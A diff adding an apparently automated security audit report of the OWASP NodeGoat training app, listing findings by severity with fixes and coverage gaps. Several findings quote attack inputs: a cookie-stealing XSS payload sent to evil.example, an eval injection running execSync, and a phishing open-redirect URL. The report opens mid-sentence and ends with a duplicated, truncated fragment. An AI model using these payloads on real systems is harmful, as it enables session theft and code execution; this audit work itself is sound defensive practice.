@@ -1,0 +1,169 @@
+## Certificate` below; running it a second time (`for f in findings/*.json; do node
+verify-safety-report.mjs --findings "$f" --list-invalid; done`) printed no id, so no submitted
+finding was mechanically rejected.
+
+**What was actually read**, aggregated from the six department reports (not the full 111-file
+tree — see `## What was not covered`): every file under `app/routes/` and `app/data/`; `server.js`
+in full; every file under `config/` (`config.js`, `config/env/all.js`, `development.js`,
+`production.js`, `test.js`); `package.json` and `package-lock.json`; `artifacts/db-reset.js` and
+`artifacts/cert/server.key`/`server.crt`; `app/views/login.html`, `profile.html`,
+`error-template.html`, `layout.html`, `dashboard.html`, `benefits.html`, `signup.html`; `app.json`,
+`Procfile`, `docker-compose.yml`, `Dockerfile` (read for credential-shaped literals, not for
+container-hardening review); `.travis.yml` and both `.github/workflows/*.yml` files (read for
+credentials only); `cypress.json`, `nodemon.json`; the three files under
+`test/e2e/fixtures/users/`; `test/security/profile-test.js`; and `test/e2e/integration/login_spec.js`
+plus `test/e2e/support/commands.js` (read only to confirm how the admin fixture is consumed).
+
+**Findings.** `findings.json` is the union of all six `findings/<department>.json`, deduplicated
+by `file` + `line` + `cwe`, keeping the entry with the higher `confidence` (all 44 submitted
+findings carry `confidence: confirmed`, so the two collisions found were broken by keeping the
+first-encountered department in alphabetical order — see `## What was not covered` for both
+dropped ids and the collision each resolves). Every entry was copied whole from its department's
+file; no `snippet`, `evidence`, `impact` or `fix` text was rewritten by the integration.
+
+## Findings
+
+### critical
+
+- `access-benefits-missing-admin-check` — Admin-only benefits page and update are reachable by any logged-in user (`app/routes/index.js:55-56`, CWE-862, confirmed) — Any authenticated, non-admin user can view the full roster of employees' benefit data and change any employee's benefitStartDate by posting an arbitrary userId to /benefits. Reinstate the `isAdmin` middleware on both the GET and POST /benefits routes so only admin users can reach benefitsHandler.
+- `data-plaintext-password-storage` — User passwords are stored in MongoDB without any hashing (`app/data/user-dao.js:25`, CWE-256, confirmed) — Anyone who can read the `users` collection - a DBA, a backup, a NoSQL-injection attacker, or anyone who obtains a Mongo dump - recovers every user's real login password in plaintext, which typically enables account takeover on other services due to password reuse. Hash the password before insertion, e.g. `password: bcrypt.hashSync(password, bcrypt.genSaltSync())`, and never store the raw value.
+- `data-plaintext-password-comparison` — Login validates the password with a plaintext string comparison instead of a hash check (`app/data/user-dao.js:61`, CWE-256, confirmed) — Confirms that the credential store holds directly usable plaintext passwords rather than a one-way hash: any reader of the database gets working credentials immediately, with no cracking required. Store a bcrypt hash and compare with `bcrypt.compareSync(fromUser, fromDB)` as shown in the adjacent disabled comment.
+- `data-ssn-dob-bank-unencrypted` — SSN, date of birth and bank account/routing numbers are persisted unencrypted (`app/data/profile-dao.js:55-66`, CWE-311, confirmed) — Anyone with read access to the `users` collection (DB compromise, backup theft, or an unrelated injection bug elsewhere in the app) obtains Social Security numbers, dates of birth and bank account/routing numbers in cleartext, enabling identity theft and fraudulent ACH transfers. Re-enable the existing encrypt()/decrypt() helpers (PBKDF2-derived key + AES-256, with a random IV persisted per record) before storing ssn/dob/bank fields, and derive the key from a securely managed secret rather than the hard-coded cryptoKey in config/env/all.js.
+- `dependencies-forever` — forever's dependency chain resolves to a critical minimist prototype-pollution advisory, with only a major-version fix available (`package.json:15`, CWE-1321, confirmed) — forever is the process manager keeping this app's Node process alive (per package.json scripts); it does not sit in the request path, but the operational tooling that restarts the app carries a critical, unpatched-in-place prototype-pollution primitive. Upgrade to forever@4.0.3 or later (expect breaking changes), or replace forever with a maintained process manager such as pm2 or a systemd unit.
+- `dependencies-mongodb` — mongodb's declared range bundles a bson version with a critical deserialization advisory (`package.json:18`, CWE-502, confirmed) — bson deserializes every document this driver reads back from MongoDB; a critical deserialization-of-untrusted-data bug at that layer, on a driver two majors behind its fix, is a plausible route to a crash or memory corruption on data the app did not fully control. Upgrade at minimum to the mongodb 3.1.13+ line to clear the DoS advisory, and plan a migration to a current major (7.x) to pick up the fixed bson.
+- `dependencies-swig` — swig carries a critical, unfixed arbitrary local file read advisory and the project is abandoned (`package.json:22`, CWE-22, confirmed) — swig is registered as a template engine via consolidate in this app; the file-read primitive during template rendering can expose arbitrary files on the server (config, TLS keys, source), and because the project is abandoned this will never be patched upstream. There is no in-place fix. Replace swig with a maintained template engine (its unofficial fork swig-templates, or migrate views to Nunjucks/EJS/Pug).
+- `dependencies-underscore` — underscore's declared range is vulnerable to a critical arbitrary-code-execution advisory (`package.json:23`, CWE-94, confirmed) — If any code path builds an underscore template string from request-influenced data (the documented trigger for this advisory class), an attacker gets arbitrary code execution in the Node process; independent of that, the recursion DoS is reachable by anyone who can get attacker-controlled data into _.isEqual/_.flatten. Upgrade underscore to >=1.13.8.
+- `injection-nosql-where-allocations` — NoSQL injection into MongoDB $where via unsanitized threshold parameter (`app/data/allocations-dao.js:78`, CWE-943, confirmed) — An attacker can inject arbitrary JavaScript that MongoDB's $where evaluator runs server-side, letting them bypass the intended filter to read other users' allocation data, exfiltrate other collections via further injected logic, or trigger denial of service (e.g. an infinite loop) against the database. Do not build $where expressions from request input. Validate/parse threshold as a number (e.g. `Number.isInteger(parseInt(threshold,10))`) and use a plain query object such as `{ userId: parsedUserId, stocks: { $gt: parsedThreshold } }` instead of `$where`.
+- `injection-eval-contributions` — Server-side eval() of request body fields allows arbitrary code execution (`app/routes/contributions.js:32-34`, CWE-95, confirmed) — Any authenticated user can submit a form field such as `require('child_process').execSync('id')` (or any JS expression) as preTax/afterTax/roth and have it executed with the privileges of the Node.js server process, leading to full remote code execution. Never eval user input. Replace with `parseInt(req.body.preTax, 10)` (and same for afterTax/roth), then validate the parsed numbers before use.
+- `secrets-seeded-admin-password-plaintext` — Admin account is seeded with a hard-coded plaintext password that the login path accepts as-is (`artifacts/db-reset.js:18`, CWE-798, confirmed) — Anyone who reads this file (anyone with repository or deployment-artifact access) learns the working password for the built-in admin account (userName "admin", isAdmin: true) on any instance stood up from this seed data, letting them log in with full administrative privileges over allocations, benefits, contributions, memos and every other user's profile data. Never seed real or default credentials in source. Generate a random admin password at deploy time (or require an operator-supplied one via environment variable), store only its bcrypt hash, and switch comparePassword back to bcrypt.compareSync as the commented-out fix already shows.
+
+### high
+
+- `access-allocations-idor` — Allocations route trusts a userId taken from the URL instead of the session (`app/routes/index.js:63`, CWE-639, confirmed) — Any authenticated user can view any other user's stock/fund/bond allocation data by changing the userId in the URL, e.g. GET /allocations/5 while logged in as user 3. Ignore req.params.userId for authorization purposes; take the id from req.session.userId, or verify req.params.userId === req.session.userId (or that the caller is an admin) before querying.
+- `access-login-no-session-regeneration` — Login does not regenerate the session id, enabling session fixation (`app/routes/session.js:116`, CWE-384, confirmed) — A session id fixed on a victim before authentication (e.g. via a non-HTTPS request or a shared/public terminal) remains valid after that victim logs in, letting the attacker who set it hijack the now-authenticated session. Wrap the post-validation logic in `req.session.regenerate(() => { req.session.userId = user._id; ... })` as is already done in handleSignup.
+- `access-csrf-protection-disabled` — CSRF middleware is commented out, leaving all state-changing routes unprotected (`app/routes/index.js:48`, CWE-352, confirmed) — A malicious page can force an authenticated victim's browser to submit forged POST requests (e.g. to /profile to change bank account/routing numbers, or to /benefits as an admin) using only the victim's session cookie, with no token to stop it. Uncomment and mount the csurf middleware before routes are registered, and require the `_csrf` token on every state-changing POST route.
+- `access-login-no-rate-limit` — Login endpoint has no rate limiting or account lockout (`app/routes/index.js:34`, CWE-307, confirmed) — An attacker can submit unlimited login attempts against any username, making online brute-force and credential-stuffing attacks practical, especially combined with the plaintext, non-constant-time password check. Add rate limiting (e.g. express-rate-limit) keyed on IP and/or username in front of POST /login, and lock or delay accounts after repeated failures.
+- `data-full-config-logged-with-secrets` — The entire application configuration, including the session and crypto secrets, is printed to stdout on every start (`config/config.js:13`, CWE-532, confirmed) — Anyone who can read the process's stdout - container logs, a log-aggregation platform, `docker logs`, CI output - obtains the express-session signing secret and the AES crypto key, letting them forge authenticated session cookies and decrypt anything encrypted with cryptoKey. Remove this console.log, or log only a fixed allow-list of non-secret keys (e.g. port, db host) instead of the whole config object.
+- `data-cleartext-http-transport` — The application only ever listens on plain HTTP, never HTTPS (`server.js:145`, CWE-319, confirmed) — Any network-position attacker (shared Wi-Fi, compromised router, ISP, or on-path proxy) can passively read or tamper with credentials, session cookies, and financial/PII fields in transit. Uncomment the https.createServer block and serve over TLS using the provided certificate/key (or terminate TLS at a reverse proxy in front of the app).
+- `data-seed-script-logs-plaintext-passwords` — The database seed script prints every user record, including plaintext passwords, to stdout (`artifacts/db-reset.js:99`, CWE-532, confirmed) — Anyone able to read the process output or deployment/CI logs obtains the admin and seeded test-user plaintext passwords, several of which (the admin account) grant elevated privileges in the running application. Log only non-sensitive fields (e.g. userName) or strip the password field before calling console.log/JSON.stringify on the seeded user records.
+- `dependencies-body-parser` — body-parser is pinned to a range vulnerable to two denial-of-service advisories (`package.json:9`, CWE-405, confirmed) — Any route in this app that parses a form or JSON body (every POST route under app/routes) can be sent a request that exhausts memory or CPU, or that silently bypasses a configured body-size limit, denying service to the single Node process. Upgrade body-parser to >=1.20.6 (declare "^1.20.6" or later).
+- `dependencies-express` — express is pinned to a range vulnerable to a reflected-XSS and an open-redirect advisory, plus 14 transitive advisories in its own dependency tree (`package.json:13`, CWE-79, confirmed) — A crafted redirect target reaching res.redirect() or a crafted route/query value can execute attacker script in a victim's browser or send them to an attacker host; the ReDoS entries in the same dependency tree can hang the single Node process for every user of the app. Upgrade express to >=4.20.0 (patches exist within the 4.x line) or migrate to the current 5.x major, then re-check the bundled body-parser/qs/path-to-regexp/send/serve-static versions.
+- `dependencies-helmet` — helmet's declared range bundles a connect/debug/ms chain with a high-severity ReDoS advisory (`package.json:16`, CWE-1333, confirmed) — helmet sets this app's security headers; a ReDoS anywhere in that chain can hang the process, and the CSP configuration-override bug can silently weaken the Content-Security-Policy helmet is meant to enforce. Upgrade helmet to a current major; this drops the connect/helmet-csp dependency chain entirely and requires adapting to helmet's per-header-function API.
+- `dependencies-marked` — marked is pinned to an exact version carrying six advisories, including two ReDoS and two XSS-sanitization bypasses (`package.json:17`, CWE-1333, confirmed) — marked renders markdown for this app's memo/tutorial views; the sanitization-bypass and data-URI advisories are the exact XSS class an attacker would target in those views, and the ReDoS advisories let a crafted markdown document hang the renderer for one request. At minimum bump the pinned version to 0.3.19 (npm audit's in-range fix); better, migrate to a current marked major, since 0.3.x is over a decade behind upstream.
+- `injection-xss-login-username` — Reflected XSS: login username echoed unescaped with autoescape disabled (`app/views/login.html:110`, CWE-79, confirmed) — Submitting a username such as `"><script>document.location='//evil.example/c?'+document.cookie</script>` on a failed login attempt executes attacker JavaScript in the victim's browser in the session cookie's origin, enabling session-cookie theft or full account takeover. Re-enable swig's default autoescaping (`autoescape: true` in server.js) and/or HTML-encode userName before interpolating it into the template attribute.
+- `injection-xss-profile-lastname` — Reflected/stored XSS: profile lastName echoed unescaped with autoescape disabled (`app/views/profile.html:45`, CWE-79, confirmed) — An attacker who submits `"><script>...</script>` as their last name gets it executed in their own browser immediately (reflected) and again every time the profile page is rendered from the stored value (persisted XSS), which combined with any admin/shared view of profile data broadens the attack to other users. Re-enable swig autoescape (`autoescape: true`) and/or explicitly HTML-encode lastName and the sibling fields (ssn, dob, address, bankAcc, bankRouting) before interpolating them into the template.
+- `platform-security-headers-disabled` — All response-header hardening (helmet, x-powered-by, CSP, X-Frame-Options, HSTS, nosniff) is commented out at the exact point it would be mounted (`server.js:38-65`, CWE-693, confirmed) — Responses carry no clickjacking, MIME-sniffing, caching or transport protections and advertise the framework via X-Powered-By, making the app substantially easier to fingerprint, frame for clickjacking/UI-redress, cache in shared proxies, and exploit via any stored/reflected markup that does slip through (no CSP to contain it). Uncomment and mount app.disable('x-powered-by') and the helmet() middleware (or an equivalent header-setting middleware) before any route handlers, configuring frameguard, a real Content-Security-Policy directive set, hsts and nosniff for the deployed environment.
+- `platform-session-cookie-insecure` — Session cookie is issued with no httpOnly, secure or sameSite attribute and the default connect.sid name (`server.js:78-102`, CWE-1004, confirmed) — The session cookie is readable by any script running on the page (no httpOnly, so XSS trivially steals it), is sent over plain HTTP (no secure), is attached to cross-site requests (no sameSite), and the default connect.sid name confirms to an attacker at a glance that the target runs Express/express-session, aiding further targeting. Set a cookie block with httpOnly: true, secure: true (once served over HTTPS) and sameSite: 'lax' or 'strict', and set key/name to a non-default value; only set saveUninitialized when a real reason requires it.
+- `platform-csrf-protection-disabled` — CSRF protection middleware is imported and wired up only inside a comment; every state-changing route runs without it (`server.js:104-113`, CWE-352, confirmed) — An attacker-controlled page can submit a cross-site POST to any authenticated NodeGoat endpoint (profile update, benefits update, memo creation, etc.) using the victim's ambient session cookie, performing the action as the victim without their consent. Uncomment app.use(csrf()) and the res.locals.csrftoken middleware, mount them after the session middleware and before routes(app, db), and render the token in every form that performs a state change.
+- `secrets-session-cookie-secret-hardcoded` — express-session secret is a hard-coded literal committed to the repository (`config/env/all.js:8`, CWE-798, confirmed) — Anyone with the source (this is a public OWASP training repo, but the same pattern in a private app is reachable by anyone with repo/build access) knows the exact HMAC key express-session uses. They can forge a validly-signed session cookie for any session id and, since the app trusts session data (e.g. userId) without further checks, impersonate any logged-in user. Read the session secret from an environment variable or secret store at startup, generate it randomly per deployment, and never commit a working value.
+
+### medium
+
+- `access-noncontant-time-password-compare` — Login password comparison uses a non-constant-time string equality check (`app/data/user-dao.js:61`, CWE-208, confirmed) — The `===` comparison short-circuits on the first mismatched byte, giving an attacker who can measure response timing (locally or over a low-jitter network) a per-character oracle to recover a victim's password. Store passwords hashed (e.g. bcrypt) and compare with a constant-time function such as bcrypt.compareSync or crypto.timingSafeEqual, never with ===.
+- `data-unsanitized-login-username-logged` — Attacker-controlled login username is written to the server log without any encoding (`app/routes/session.js:64`, CWE-117, confirmed) — A remote, unauthenticated attacker can submit a userName containing CR/LF sequences to forge extra fake log lines (log forging), and any personal data a visitor types into the username field (many users type an email address) is written to operational logs verbatim. Encode the value before logging, e.g. `userName.replace(/[\r\n]/g, "_")` or `ESAPI.encoder().encodeForHTML(userName)`, as already shown in the adjacent disabled comment.
+- `data-error-object-rendered-to-client` — Internal error objects are rendered directly into the HTML response sent to the browser (`app/routes/error.js:10-12`, CWE-209, confirmed) — Any code path that calls `next(err)` - including MongoDB driver failures inside the DAOs - leaks internal error text (and, depending on the error object's toString, potentially internal implementation details) to whichever client triggered it, and because autoescape is off, an error message containing HTML/script is reflected unescaped. Render a fixed, generic error message to the client and keep the full error object (message and stack) only in the server-side log.
+- `injection-open-redirect-learn` — Open redirect via unvalidated url query parameter (`app/routes/index.js:72`, CWE-601, confirmed) — An attacker can craft a link like `https://victim/learn?url=https://evil.example/phish` that appears to come from the trusted NodeGoat domain but redirects the logged-in victim to an attacker-controlled site, enabling phishing or token-leaking OAuth-style flows. Validate the destination against an allow-list of known-safe paths (e.g. only relative paths under the app, or a fixed set of external learning-resource URLs) before calling res.redirect, and reject anything else.
+- `platform-error-handler-leaks-error-object` — The global error handler renders the raw Error object to the client on every unhandled error (`app/routes/error.js:7-12`, CWE-209, confirmed) — Any unexpected failure (a Mongo error, a thrown exception in route code) sends the raw error text - potentially including internal details such as collection/field names or driver messages - straight to the browser, and because autoescape is disabled anywhere the error text contains HTML/script-like characters it is rendered unescaped. In the error handler, log err.stack server-side only and render a fixed, generic message to the client (e.g. "error: Something went wrong"); never pass the Error object itself into the view.
+- `platform-default-env-is-development` — The application silently boots in development mode, injecting a live-reload script and a hard-coded ZAP API key into every page, whenever NODE_ENV is unset (`config/config.js:5`, CWE-1188, confirmed) — A production deployment that forgets to set NODE_ENV=production keeps loading an externally-hosted livereload script into every authenticated page (a supply-chain / script-injection surface) and exposes ZAP configuration values that should never ship to users. Fail closed: require NODE_ENV to be explicitly set (or default to "production") rather than defaulting to "development", and keep environmentalScripts and other dev-only settings out of any config module loaded when NODE_ENV is not "development".
+- `platform-open-redirect-learn` — The /learn route redirects to an attacker-controlled URL taken directly from the query string (`app/routes/index.js:70-73`, CWE-601, confirmed) — An attacker sends a logged-in user a link like /learn?url=https://evil.example/phish; the app's own trusted domain issues the redirect, which is commonly used to defeat phishing filters and to chain into OAuth/token-leak attacks. Validate the target against an allow-list of known-safe internal paths (or require it to be a relative path on the same origin) before calling res.redirect().
+- `secrets-config-dump-to-console-log` — The merged application config, including the session secret, is printed to stdout/logs on every startup (`config/config.js:12-13`, CWE-532, confirmed) — Any process, container log aggregator, CI job log, or operator with read access to the application's stdout/log stream obtains the session-signing secret and crypto key in cleartext, without needing source access at all. Never log a config object that carries secrets; log only a redacted/allow-listed subset (port, environment name, host), or log key names without values.
+- `secrets-rsa-private-key-committed` — An RSA private key is committed to the repository under artifacts/cert (`artifacts/cert/server.key:1-15`, CWE-321, confirmed) — Anyone with read access to the repository obtains the private key matching server.crt. If this certificate/key pair is ever used to terminate TLS for a real deployment (as the commented-out code in server.js intends), whoever holds this key can decrypt intercepted traffic or impersonate the server in a man-in-the-middle attack. Never commit private key material. Remove artifacts/cert/server.key and server.crt from the repository and history, generate keys per-deployment (or via a certificate manager), and load them from a secret store or mounted volume outside version control.
+
+### low
+
+- `dependencies-csurf` — csurf, the app's CSRF-protection middleware, is archived/unmaintained and bundles a flawed cookie parser (`package.json:11`, CWE-1104, confirmed) — The app's CSRF defense is built on an abandoned package; the low-severity cookie-parsing bug is unlikely to be fixed in place, and any future csurf-specific advisory has no upstream to patch it. Replace csurf with an actively maintained CSRF library (e.g. csrf-sync) rather than upgrading in place, since csurf itself will not receive further releases.
+- `dependencies-express-session` — express-session's declared range bundles a cookie parser with an out-of-bounds character advisory (`package.json:14`, CWE-74, confirmed) — express-session issues and reads the session cookie for the whole app; the out-of-bounds cookie-character bug and the header-manipulation bug in its dependency chain are low severity individually, but they sit directly on the session-cookie path. Upgrade express-session to >=1.19.0.
+- `dependencies-bcrypt-nodejs-unmaintained` — bcrypt-nodejs, used to hash every user password, has been unmaintained for over a decade (`package.json:8`, CWE-1104, confirmed) — No active exploit is claimed. The risk is that the library performing every password hash in this app has had no maintainer for 12+ years and is already superseded by actively maintained forks named in its own deprecation notice. Replace bcrypt-nodejs with bcrypt or bcryptjs, both actively maintained drop-in alternatives.
+- `secrets-test-fixture-admin-password` — E2E test fixture hard-codes the same admin password the app seeds into its database (`test/e2e/fixtures/users/admin.json:3`, CWE-798, confirmed) — Confirms and duplicates the exposure of the seeded admin credential in a second, test-only location; anyone reading the test suite also learns the working admin password without needing to inspect the seed script. Once the admin password is generated per-deployment instead of hard-coded (see the fix for secrets-seeded-admin-password-plaintext), have the E2E fixtures read the same generated credential from environment/config instead of duplicating a literal.
+
+### info
+
+- `dependencies-node-esapi-unmaintained` — node-esapi, used for output encoding in the profile view, was published once in 2014 and never updated (`package.json:20`, CWE-1104, confirmed) — The app depends on a single 2014 snapshot of an OWASP-ESAPI port for an encoding routine; there is no upstream to fix a bug in that encoder if one is ever found, and the project reads as fully abandoned. Move to a maintained, actively updated encoding library (e.g. the `he` package for HTML entity encoding) instead of node-esapi.
+
+## What was not covered
+
+**Dropped findings (mechanically superseded, not examiner-rejected).** Re-running the examiner
+(`for f in findings/*.json; do node verify-safety-report.mjs --findings "$f" --list-invalid;
+done`) printed no id: every one of the 44 submitted findings verified against the target. Two ids
+are nonetheless absent from `findings.json`, dropped by the union's own dedup rule
+(`file`+`line`+`cwe`, keep the higher-confidence entry) because a second department independently
+filed the identical `file`+`line`+`cwe` at the same `confirmed` confidence:
+
+- `platform-no-rate-limit-on-auth-routes` — same key (`app/routes/index.js:34`, CWE-307) as
+  `access-login-no-rate-limit`, which is kept; both departments cite the same missing
+  rate-limiting middleware on `POST /login`, at the same confidence, so only one entry survives
+  the union.
+- `platform-cleartext-http-only` — same key (`server.js:145`, CWE-319) as
+  `data-cleartext-http-transport`, which is kept; both departments cite the same plain-HTTP
+  listener, at the same confidence, so only one entry survives the union.
+
+**Departments, file kinds and defect classes no one reached.**
+
+- No department performed dynamic testing, exploitation, or ran the application; every finding
+  in this report is a static read of source text, confirmed only to exist at the cited line, not
+  confirmed to be exploitable against a running instance.
+- Vendored front-end code under `app/assets/vendor/` (bootstrap, jquery, the chart libraries,
+  font-awesome, html5shiv) and the application's own client scripts under `app/assets/js/` were
+  either not opened or only grepped for a narrow pattern set (CORS/rate-limit/DOM-sink patterns
+  by `platform`); no department read them line by line for client-side defects.
+  `app/assets/favicon.ico`, `app/assets/images/*.png` and the font files under
+  `app/assets/vendor/theme/font-awesome/fonts/` are binary assets outside any department's brief.
+- Most of `test/e2e/integration/` (`allocations_spec.js`, `benefits_spec.js`,
+  `contributions_spec.js`, `dashboard_spec.js`, `general_spec.js`, `learn_spec.js`,
+  `logout_spec.js`, `memos_spec.js`, `research_spec.js`, `signup_spec.js`, `tutorial_spec.js`) and
+  `test/e2e/plugins/index.js`/`test/e2e/support/index.js` were not opened by any department;
+  `login_spec.js` and `commands.js` were read only to confirm how the admin credential fixture is
+  consumed, not for defects of their own.
+- Docker and CI configuration (`Dockerfile`, `docker-compose.yml`, `app.json`, `Procfile`,
+  `.travis.yml`, `.github/workflows/*.yml`) was read only for credential-shaped literals by the
+  `secrets` department; container-hardening concerns (base image pinning, running as non-root,
+  exposed ports, secret-mount hygiene) and CI/CD pipeline hardening (script injection via
+  workflow triggers, unpinned third-party actions) were not assessed by any department.
+  `Gruntfile.js` was checked only for `child_process.exec` calls reachable from request data
+  (none found; both `exec` sites take build-time literals) and not read for other issues.
+  `.jshintrc`, `.jshintignore`, `.oxlintrc`-equivalent lint configuration and `.editorconfig`
+  were not reviewed.
+- Server-side request forgery: `app/routes/research.js` builds an outbound URL from
+  `req.query.url` and `req.query.symbol` and fetches it with `needle.get()`, streaming the
+  response back to the client. Both `access` and `injection` explicitly noted this in their
+  reports and both declined to file it — `access` because it is not an access-control defect,
+  `injection` because it judged SSRF to be a different department's lane — so no `findings/*.json`
+  entry covers it. It is disclosed here as a genuine coverage gap, not a rejected finding.
+- `app/routes/memos.js`'s `displayMemos` lists every memo for every logged-in user with no
+  per-author filtering. `access` read this and judged it a data-model choice (memos as a shared
+  feed) rather than a broken authorization check, and did not file it; no other department
+  reviewed `memos.js`. Whether that horizontal-exposure pattern is intentional was not settled by
+  this review.
+- `injection` identified that `marked.setOptions({ sanitize: true })` (`server.js:126-128`) is
+  applied before memo markdown is rendered, but did not test the installed `marked@0.3.5`
+  sanitizer against known bypass payloads for the CVEs `dependencies-marked` already lists; the
+  question of whether stored memo content can defeat that sanitizer in this exact version was
+  left open, not filed as a finding.
+- `dependencies` audited `devDependencies` (14 of 20 packages carry advisories, three of them
+  critical: `cypress`, `grunt`, `mocha`) but did not write up any of them as individual findings,
+  judging build/CI-only tooling out of the shipped-application scope this report's findings
+  target; that audit output was not preserved as `findings/*.json` entries and is not counted in
+  `## Certificate` below.
+- No full-repository static-analysis run was performed. `semgrep` ran once, by `injection` only,
+  over its own rule set (`$where`, `eval`-on-input, hardcoded secrets) as a triage aid whose hits
+  were all manually confirmed or discarded; it was not run by any other department, and no
+  broader SAST/DAST/SCA tool beyond `npm audit`/`npm view` was used anywhere in this program.
+
+## Certificate
+
+Verified findings: 42
+Target tree: 78ac112b7bd5083bb065086c4642dcd8a3932a8d3052f9405503124c90a70fe3
+
+This review does not certify the absence of vulnerabilities; it certifies only that each listed finding was mechanically verified to exist at the cited line, over the files listed in "Scope and method".
+
+--- not covered (first 900) ---
+## What was not covered`): every file under `app/routes/` and `app/data/`; `server.js`
+in full; every file under `config/` (`config.js`, `config/env/all.js`, `development.js`,
+`production.js`, `test.js`); `package.json` and `package-lock.json`; `artifacts/db-reset.js` and
+`artifacts/cert/server.key`/`server.crt`; `app/views/login.html`, `profile.html`,
+`error-template.html`, `layout.html`, `dashboard.html`, `benefits.html`, `signup.html`; `app.json`,
+`Procfile`, `docker-compose.yml`, `Dockerfile` (read for credential-shaped literals, not for
+container-hardening review); `.travis.yml` and both `.github/workflows/*.yml` files (read for
+credentials only); `cypress.json`, `nodemon.json`; the three files under
+`test/e2e/fixtures/users/`; `test/security/profile-test.js`; and `test/e2e/integration/login_spec.js`
+plus `test/e2e/support/commands.js` (read only to confirm how the admin fixture is 
